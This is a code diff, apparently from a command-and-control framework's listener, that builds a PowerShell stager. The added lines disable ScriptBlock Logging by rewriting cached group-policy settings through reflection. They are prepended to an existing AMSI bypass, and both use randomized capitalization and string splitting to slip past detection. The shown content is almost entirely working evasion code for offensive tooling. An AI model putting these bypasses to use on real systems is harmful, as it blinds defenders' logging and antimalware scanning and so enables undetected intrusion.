@@ -171,8 +171,18 @@ class Listener:
 
                 stager = ''
                 if safeChecks.lower() == 'true':
+                    # ScriptBlock Logging bypass
+                    stager = helpers.randomize_capitalization("$GroupPolicySettings = [ref].Assembly.GetType(")
+                    stager += "'System.Management.Automation.Utils'"
+                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
+                    stager += "'cachedGroupPolicySettings', 'N'+'onPublic,Static'"
+                    stager += helpers.randomize_capitalization(").GetValue($null);$GroupPolicySettings")
+                    stager += "['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0;"
+                    stager += helpers.randomize_capitalization("$GroupPolicySettings")
+                    stager += "['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0;"
+
                     # @mattifestation's AMSI bypass
-                    stager = helpers.randomize_capitalization("[Ref].Assembly.GetType(")
+                    stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.AmsiUtils'"
                     stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
                     stager += "'amsiInitFailed','NonPublic,Static'"
